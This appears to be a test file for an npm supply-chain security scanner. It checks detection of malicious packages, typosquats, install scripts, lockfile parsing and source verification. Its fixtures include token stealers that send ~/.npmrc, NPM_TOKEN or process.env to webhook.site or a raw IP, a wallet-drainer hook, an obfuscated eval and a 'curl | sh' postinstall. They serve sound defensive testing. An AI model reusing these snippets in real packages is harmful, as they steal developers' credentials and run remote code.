import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  scanFiles, scanInstallScript, installEntryFiles, typosquatOf, parseInput, parseGithub,
  readTarball, applyConfig, toSarif, verdictOf,
} from '../dist/core/index.js';

const sev = (findings) => verdictOf(findings);

test('flags a token stealer that posts to a webhook', () => {
  const r = scanFiles([{ path: 'index.js', size: 1, text: `
    const t = require('fs').readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
    fetch('https://webhook.site/abc', { method: 'POST', body: t });` }]);
  assert.equal(sev(r.findings), 'danger');
  assert.ok(r.findings.some((f) => f.code === 'code-drop-service'));
  assert.ok(r.findings.some((f) => f.code === 'code-secrets' && f.severity === 'danger'));
});

test('flags a wallet drainer that hooks window.ethereum', () => {
  const r = scanFiles([{ path: 'dist/index.js', size: 1, text: 'window.ethereum.request = async function (a) { return swap(a) }' }]);
  assert.equal(sev(r.findings), 'danger');
});

test('flags hidden eval', () => {
  const r = scanFiles([{ path: 'lib.js', size: 1, text: "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())" }]);
  assert.equal(sev(r.findings), 'danger');
});

test('env dump plus network in install file is dangerous', () => {
  const r = scanFiles([{ path: 'setup.js', size: 1, text: "const https=require('https'); https.request({host:'x'}).end(JSON.stringify(process.env))" }], ['setup.js']);
  assert.equal(sev(r.findings), 'danger');
});

test('ordinary code is clean', () => {
  const r = scanFiles([{ path: 'index.js', size: 1, text: "module.exports = (a, b) => a + b; // fetch nothing\nconst x = process.env.NODE_ENV;" }]);
  assert.equal(r.findings.length, 0);
});

test('test and docs folders are skipped', () => {
  const r = scanFiles([{ path: 'test/fixture.js', size: 1, text: "fetch('https://webhook.site/x')" }]);
  assert.equal(r.findings.length, 0);
});

test('install scripts: network is danger, node-gyp is info, other is review', () => {
  assert.equal(scanInstallScript({ postinstall: 'curl -s https://x.sh | sh' })[0].severity, 'danger');
  assert.equal(scanInstallScript({ install: 'node-gyp rebuild' })[0].severity, 'info');
  assert.equal(scanInstallScript({ postinstall: 'node scripts/setup.js' })[0].severity, 'review');
  assert.deepEqual(scanInstallScript({ test: 'jest' }), []);
  assert.deepEqual(installEntryFiles({ postinstall: 'node ./scripts/setup.js' }), ['scripts/setup.js']);
});

test('typosquats', () => {
  assert.equal(typosquatOf('lodahs'), 'lodash');
  assert.equal(typosquatOf('expresss'), 'express');
  assert.equal(typosquatOf('crossenv'), 'cross-env');
  assert.equal(typosquatOf('electorn'), 'electron');
  assert.equal(typosquatOf('express'), null);
  assert.equal(typosquatOf('react-dom'), null);
  assert.equal(typosquatOf('zod'), null);
});

test('parses package.json, lockfile v3 and plain lists', () => {
  const pj = parseInput(JSON.stringify({ dependencies: { a: '^1' }, devDependencies: { b: '2.0.0' } }));
  assert.equal(pj.kind, 'package.json');
  assert.equal(pj.deps.length, 2);
  assert.equal(parseInput(JSON.stringify({ dependencies: { a: '^1' }, devDependencies: { b: '2' } }), { includeDev: false }).deps.length, 1);
  const lock = parseInput(JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': { dependencies: { a: '^1' } },
      'node_modules/a': { version: '1.2.0' },
      'node_modules/a/node_modules/@s/b': { version: '0.1.0' },
      'node_modules/c': { version: '3.0.0', dev: true },
    },
  }));
  assert.equal(lock.kind, 'package-lock.json');
  assert.deepEqual(lock.deps.map((d) => [d.name, d.spec, d.direct]), [['a', '1.2.0', true], ['@s/b', '0.1.0', false], ['c', '3.0.0', false]]);
  const list = parseInput('chalk@5.6.1 @ctrl/tinycolor@4.1.1 lodash');
  assert.deepEqual(list.deps.map((d) => `${d.name}|${d.spec}`), ['chalk|5.6.1', '@ctrl/tinycolor|4.1.1', 'lodash|latest']);
  assert.deepEqual(parseGithub('https://github.com/expressjs/express'), { owner: 'expressjs', repo: 'express', ref: 'HEAD', dir: '' });
  assert.equal(parseGithub('vercel/next.js/tree/canary/packages/next').dir, 'packages/next');
});

test('reads a real npm-style tarball and finds the payload in the install file', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'albertros-'));
  mkdirSync(join(dir, 'package'));
  writeFileSync(join(dir, 'package', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'node setup.js' } }));
  writeFileSync(join(dir, 'package', 'setup.js'), "require('child_process').exec('id'); require('https').get('http://45.9.148.3/x?k=' + process.env.NPM_TOKEN)");
  execFileSync('tar', ['-czf', join(dir, 'evil.tgz'), '-C', dir, 'package']);
  const url = 'data:application/gzip;base64,' + readFileSync(join(dir, 'evil.tgz')).toString('base64');
  const files = await readTarball(url);
  assert.ok(files.some((f) => f.path === 'setup.js' && f.text.includes('child_process')));
  const r = scanFiles(files, installEntryFiles({ postinstall: 'node setup.js' }));
  assert.equal(sev(r.findings), 'danger');
  assert.ok(r.findings.some((f) => f.code === 'code-raw-ip'));
});

test('config allowlist downgrades findings and SARIF lists the rest', () => {
  const report = {
    source: 'package.json', startedAt: '', finishedAt: '', skipped: 0, score: 0, counts: {},
    packages: [
      { name: 'a', spec: '1', version: '1.0.0', direct: true, dev: false, verdict: 'danger', meta: {}, scanned: false,
        findings: [{ code: 'typosquat', severity: 'danger', title: 'x', detail: 'y' }] },
      { name: 'b', spec: '1', version: '1.0.0', direct: true, dev: false, verdict: 'review', meta: {}, scanned: false,
        findings: [{ code: 'deprecated', severity: 'review', title: 'x', detail: 'y' }] },
    ],
  };
  applyConfig(report, { allow: ['a@1.0.0'] });
  assert.equal(report.counts.danger, 0);
  assert.equal(report.counts.review, 1);
  const sarif = toSarif(report, 'package.json', '{\n  "dependencies": {\n    "b": "1"\n  }\n}');
  assert.equal(sarif.runs[0].results.length, 1);
  assert.equal(sarif.runs[0].results[0].locations[0].physicalLocation.region.startLine, 3);
});

test('live: catches the Sept 2025 chalk hijack and npm takedowns', { skip: !process.env.LIVE }, async () => {
  const { analyzeProject } = await import('../dist/core/index.js');
  const r = await analyzeProject('live', [
    { name: 'chalk', spec: '5.6.1', direct: true },
    { name: 'lodahs', spec: '*', direct: true },
    { name: 'express', spec: '^4.21.2', direct: true },
  ]);
  const v = Object.fromEntries(r.packages.map((p) => [p.name, p.verdict]));
  assert.equal(v.chalk, 'danger');
  assert.equal(v.lodahs, 'danger');
  assert.equal(v.express, 'safe');
});

import { verifyAgainstSource, githubRepo } from '../dist/core/index.js';

function fakeGithub(files) {
  const real = globalThis.fetch;
  globalThis.fetch = async (url) => {
    const m = /raw\.githubusercontent\.com\/acme\/lib\/abc1234def\/(.*)$/.exec(String(url));
    if (m && m[1] in files) return new Response(files[m[1]], { status: 200 });
    return new Response('not found', { status: 404 });
  };
  return () => (globalThis.fetch = real);
}
const manifest = { name: 'lib', version: '1.0.1', gitHead: 'abc1234def', main: 'index.js', repository: { url: 'git+https://github.com/acme/lib.git' } };

test('source check: identical release is verified', async () => {
  const restore = fakeGithub({ 'package.json': '{"name":"lib"}', 'index.js': 'module.exports = 1;\n' });
  try {
    const { check, findings } = await verifyAgainstSource(manifest, [{ path: 'index.js', size: 20, text: 'module.exports = 1;' }]);
    assert.equal(check.status, 'verified');
    assert.equal(findings[0].code, 'source-verified');
  } finally { restore(); }
});

test('source check: injected stealer that is not in git is danger, with the lines shown', async () => {
  const restore = fakeGithub({ 'package.json': '{"name":"lib"}', 'index.js': 'module.exports = 1;\n' });
  try {
    const published = "module.exports = 1;\nfetch('https://webhook.site/x', { method: 'POST', body: JSON.stringify(process.env) });";
    const { check, findings } = await verifyAgainstSource(manifest, [{ path: 'index.js', size: 99, text: published }]);
    assert.equal(check.status, 'differs');
    assert.equal(findings[0].severity, 'danger');
    assert.ok(findings[0].evidence.some((e) => e.includes('webhook.site')));
  } finally { restore(); }
});

test('source check: commit missing from the repo is flagged', async () => {
  const restore = fakeGithub({});
  try {
    const { check } = await verifyAgainstSource(manifest, [{ path: 'index.js', size: 1, text: 'x' }]);
    assert.equal(check.status, 'commit-missing');
  } finally { restore(); }
});

test('github repo parsing', () => {
  assert.deepEqual(githubRepo({ repository: 'git://github.com/debug-js/debug.git' }), { owner: 'debug-js', repo: 'debug', dir: '' });
  assert.deepEqual(githubRepo({ repository: { url: 'https://github.com/a/b', directory: 'packages/x' } }), { owner: 'a', repo: 'b', dir: 'packages/x' });
  assert.equal(githubRepo({ repository: 'https://gitlab.com/a/b' }), null);
});
